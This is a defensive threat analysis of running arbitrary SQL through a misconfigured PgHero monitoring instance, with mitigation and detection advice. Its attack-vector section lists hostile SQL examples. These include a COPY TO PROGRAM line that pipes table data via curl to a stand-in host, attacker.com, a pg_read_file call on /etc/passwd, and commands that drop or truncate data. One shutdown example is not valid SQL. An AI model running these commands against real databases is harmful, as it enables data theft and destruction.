# Deep Analysis of Attack Tree Path: 2.1 - Run Arbitrary SQL Queries via PgHero

## 1. Objective

The objective of this deep analysis is to thoroughly examine the attack path where an attacker exploits a misconfigured PgHero instance to execute arbitrary SQL queries against the connected database.  We aim to understand the specific vulnerabilities, potential attack vectors, impact, and effective mitigation strategies.  This analysis will inform security recommendations for the development team.

## 2. Scope

This analysis focuses specifically on attack path **2.1** from the provided attack tree:  "Run Arbitrary SQL Queries (If PgHero allows this and permissions are misconfigured)".  We will consider:

*   **PgHero Configuration:**  How PgHero's settings (specifically, whether it allows arbitrary query execution) contribute to the vulnerability.
*   **Database User Privileges:**  The permissions granted to the database user account that PgHero utilizes.  This is the *primary* factor determining the extent of damage an attacker can inflict.
*   **Attack Vectors:**  The specific SQL commands an attacker might use for data exfiltration, modification, or disruption (sub-paths 2.1.1, 2.1.2, and 2.1.3).
*   **Mitigation Strategies:**  Practical steps to prevent or mitigate this attack, focusing on both PgHero configuration and database security best practices.
*   **Detection:** How to identify this type of attack.

We will *not* cover:

*   Other attack vectors against PgHero (e.g., exploiting vulnerabilities in the PgHero application itself, compromising the server hosting PgHero).  These are outside the scope of this specific attack path.
*   General database security best practices unrelated to PgHero.

## 3. Methodology

This analysis will employ the following methodology:

1.  **Review of PgHero Documentation:**  Examine the official PgHero documentation (https://github.com/ankane/pghero) to understand its features, configuration options, and intended use cases.  Specifically, we'll look for information on query execution capabilities and security recommendations.
2.  **Threat Modeling:**  Analyze the attack path from the attacker's perspective, considering their motivations, capabilities, and potential actions.
3.  **Vulnerability Analysis:**  Identify the specific vulnerabilities that enable this attack path, focusing on misconfigurations and excessive privileges.
4.  **Impact Assessment:**  Evaluate the potential consequences of a successful attack, including data breaches, data loss, and service disruption.
5.  **Mitigation Strategy Development:**  Propose concrete, actionable steps to prevent or mitigate the identified vulnerabilities.
6.  **Detection Strategy Development:** Propose concrete, actionable steps to detect the identified vulnerabilities.

## 4. Deep Analysis of Attack Path 2.1

### 4.1. PgHero's Role and Configuration

PgHero is primarily a performance monitoring and diagnostics tool for PostgreSQL.  A key feature is its ability to display information about database activity, slow queries, and other metrics.  Crucially, *some configurations of PgHero allow users to execute arbitrary SQL queries directly through the PgHero web interface*. This feature, while potentially useful for debugging, is the core enabler of this attack path.

**Vulnerability:**  If the "query execution" feature is enabled in PgHero *and* the connected database user has excessive privileges, an attacker who gains access to the PgHero interface can run any SQL command they choose.

### 4.2. Database User Privileges (The Critical Factor)

The severity of this attack is *entirely* dependent on the privileges granted to the database user account that PgHero uses to connect to the PostgreSQL database.

*   **Superuser Account (Worst Case):** If PgHero connects as a superuser (e.g., the `postgres` user), an attacker has *complete control* over the database. They can read, modify, or delete any data, create or drop users, and even shut down the database server.
*   **Read-Write Access to All Tables:**  If the PgHero user has read and write access to all tables, an attacker can exfiltrate sensitive data and potentially modify or delete critical information.
*   **Read-Only Access to All Tables:**  An attacker can still exfiltrate sensitive data, but they cannot modify or delete it.  This is still a significant breach.
*   **Limited Read-Only Access (Best Case):**  Ideally, the PgHero user should only have read-only access to the specific system views and tables required for its monitoring functions (e.g., `pg_stat_activity`, `pg_stat_statements`).  This drastically limits the attacker's capabilities.

**Vulnerability:**  Excessive database user privileges amplify the impact of the enabled query execution feature in PgHero.

### 4.3. Attack Vectors (Sub-Paths 2.1.1, 2.1.2, 2.1.3)

Let's examine the specific SQL commands an attacker might use:

*   **2.1.1. Data Exfiltration (SELECT):**

    *   `SELECT * FROM users;` (Retrieve all user data, including potentially sensitive information like passwords, emails, etc.)
    *   `SELECT * FROM credit_card_transactions;` (Retrieve financial data.)
    *   `SELECT * FROM medical_records;` (Retrieve sensitive health information.)
    *   `SELECT pg_read_file('/etc/passwd');` (Attempt to read system files – only possible with superuser privileges or specific file permissions.)
    *   `COPY (SELECT * FROM sensitive_table) TO PROGRAM 'curl -X POST -d @- https://attacker.com/exfiltrate';` (Use `COPY TO PROGRAM` to send data to an attacker-controlled server – requires superuser or specific privileges.)

*   **2.1.2. Data Modification (UPDATE, DELETE):**

    *   `UPDATE users SET password = 'new_password' WHERE username = 'admin';` (Change a user's password.)
    *   `DELETE FROM orders WHERE order_id = 123;` (Delete a specific order.)
    *   `UPDATE products SET price = 0.01;` (Massively reduce product prices.)
    *   `TRUNCATE TABLE users;` (Delete all data from the `users` table.)

*   **2.1.3. Database Disruption (DROP, Shutdown):**

    *   `DROP TABLE users;` (Delete the entire `users` table.)
    *   `DROP DATABASE mydatabase;` (Delete the entire database – requires appropriate privileges.)
    *   `SELECT pg_terminate_backend(pid) FROM pg_stat_activity;` (Terminate all active database connections.)
    *   `SELECT pg_reload_conf();` (Reload the database configuration, potentially causing disruption.)
    *   `SELECT pg_ctl(datadir, 'stop');` (Attempt to shut down the database server – requires superuser privileges and direct access to the server.)

### 4.4. Impact Assessment

The impact of a successful attack ranges from significant to catastrophic, depending on the database user's privileges:

*   **Data Breach:**  Exposure of sensitive data (PII, financial information, health records, etc.) leading to legal and reputational damage.
*   **Data Loss:**  Permanent loss of critical data due to malicious deletion or modification.
*   **Service Disruption:**  Downtime of the application due to database corruption or shutdown.
*   **Financial Loss:**  Direct financial losses due to fraudulent transactions, data recovery costs, and legal penalties.
*   **Reputational Damage:**  Loss of customer trust and damage to the organization's reputation.

### 4.5. Mitigation Strategies

The following mitigation strategies are crucial:

1.  **Principle of Least Privilege (Most Important):**
    *   Create a dedicated database user account *specifically* for PgHero.
    *   Grant this user the *absolute minimum* necessary privileges.  This likely means read-only access to a limited set of system views and tables (e.g., `pg_stat_activity`, `pg_stat_statements`, and potentially some custom views).
    *   *Never* use a superuser account or an account with broad read-write access.
    *   Regularly review and audit the privileges of the PgHero user to ensure they remain minimal.

2.  **Disable Arbitrary Query Execution (If Possible):**
    *   If the ability to run arbitrary SQL queries through PgHero is not *strictly* necessary for your use case, disable this feature.  Consult the PgHero documentation for instructions on how to do this.  This eliminates the attack vector entirely.

3.  **Input Validation and Sanitization (If Query Execution is Required):**
    *   If you *must* allow query execution, implement rigorous input validation and sanitization to prevent SQL injection.  This is a complex task and should be handled by experienced developers.
    *   Use parameterized queries or prepared statements to ensure that user input is treated as data, not as executable code.
    *   Whitelist allowed query patterns rather than blacklisting dangerous ones.

4.  **Database Firewall:**
    *   Consider using a database firewall (e.g., `pg_firewall`, `pgAudit`) to restrict the types of queries that can be executed by the PgHero user, even if it has broader privileges than intended.  This adds an extra layer of defense.

5.  **Network Segmentation:**
    *   Isolate the PgHero instance and the database server on a separate network segment to limit the impact of a compromise.

6.  **Regular Security Audits:**
    *   Conduct regular security audits of the PgHero configuration, database user privileges, and network security to identify and address potential vulnerabilities.

### 4.6 Detection Strategies
1.  **Log and Monitor Queries:**
    * Enable extensive logging of all SQL queries executed against the database. PostgreSQL offers various logging options (e.g., `log_statement = 'all'`).
    * Use a log management system (e.g., ELK stack, Splunk) to collect, analyze, and alert on suspicious query patterns. Look for:
        * Queries originating from the PgHero user that access sensitive tables.
        * Queries containing `UPDATE`, `DELETE`, `DROP`, or other potentially destructive commands.
        * Unusual query patterns or frequencies.
        * Queries attempting to access system files or execute external programs.
2.  **PgHero Audit Logs:**
    * If PgHero provides audit logs of user activity (check the documentation), monitor these logs for unauthorized access or query execution.
3.  **Intrusion Detection System (IDS):**
    * Deploy an IDS to monitor network traffic for suspicious activity, including SQL injection attempts and data exfiltration.
4.  **Database Activity Monitoring (DAM):**
    * Consider using a DAM solution to provide real-time monitoring and alerting of database activity, including unauthorized access and data manipulation.
5.  **Alerting:**
    * Configure alerts to trigger on any of the above suspicious activities. Alerts should be sent to the security team for immediate investigation.

## 5. Conclusion

The attack path of running arbitrary SQL queries through a misconfigured PgHero instance poses a significant security risk. The primary vulnerability is the combination of an enabled query execution feature in PgHero and excessive privileges granted to the connected database user.  By implementing the mitigation strategies outlined above, particularly the principle of least privilege and disabling unnecessary features, the risk can be significantly reduced or eliminated.  Continuous monitoring and logging are essential for detecting and responding to potential attacks.
